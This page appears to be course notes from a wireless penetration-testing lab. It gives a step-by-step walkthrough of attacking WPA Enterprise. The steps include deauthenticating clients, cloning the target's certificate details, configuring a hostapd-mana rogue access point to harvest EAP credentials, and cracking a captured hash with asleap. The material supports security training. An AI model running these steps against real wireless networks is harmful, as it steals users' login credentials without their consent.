# Attacking WPA Enterprise

WPA Enterprise uses Extensible Authentication Protocol (EAP).[1](https://portal.offsec.com/courses/pen-210-9545/learning/attacking-wpa-enterprise-15796/attacking-wpa-enterprise-16073#fn-local_id_326-1) EAP is a framework for authentication, which allows a number of different authentication schemes or methods.

### Attack

Let's take a moment to summarize our attack. We will be creating a rogue AP to match the settings of our target as closely as possible. We will use hostapd-mana to create the rogue AP and match the target settings. This will help us capture the credentials, which we will crack later.



After putting our **wlan0** interface in monitor mode, we now have an interface called **wlan0mon**. We will identify the channel of the target AP and gather its ESSID and BSSID.

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Let's return to our attack. Next, we will restart the capture on the same channel as the AP. This is similar to what we did when cracking WPA-PSK. We'll save the data to disk as Playtronics-01.cap.

In order to get the certificate, we can deauthenticate a client. We'll do this the same way we would with a WPA-PSK client, using _aireplay-ng_.

Once airodump-ng indicates we've captured a handshake, we can stop the capture. In most instances, a certificate is present. We will get the certificate from the enterprise authentication that happened before the handshake.

We can now disable monitor mode by running **sudo airmon-ng stop wlan0mon**.

We have to open the capture file with _Wireshark_ and locate the server certificate frame.

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

For each certificate, we right click and select _Export Packet Bytes_ to save the data into a file with a .der extension.

As a root user, we'll need to navigate to /etc/freeradius/3.0/certs and change the settings of ca.cnf. We edit the **\[certificate\_authority]** fields to match our target CA certificate to appear less suspicious to clients in case they inspect the certificate.

```
...
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
...
```

The server information needs to be updated in server.cnf. This should be similar to what we did with the CA. We will edit the **\[server]** fields to match our target server certificate. We'll skip client.cnf because we don't need it.

```
...
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"
...
```

delete the DH file before running make.

```
openssl dhparam -out dh -2 2048
```

we have to create the hostapd-mana configuration file, /etc/hostapd-mana/mana.conf:

```
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

We'll now need to create the EAP user file referenced in the configuration file, /etc/hostapd-mana/mana.eap\_user. The file should contain the following.

{% code overflow="wrap" %}
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```
{% endcode %}

We're ready to continue. Next, we'll start hostapd-mana with the configuration file we created earlier, /etc/hostapd-mana/mana.conf.

```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```

When a victim attempts to authenticate to our AP, the login attempt is captured. These credentials are also in /tmp/hostapd.credout.

We will be using **asleap** to crack the password hash.

{% code overflow="wrap" %}
```
asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
```
{% endcode %}

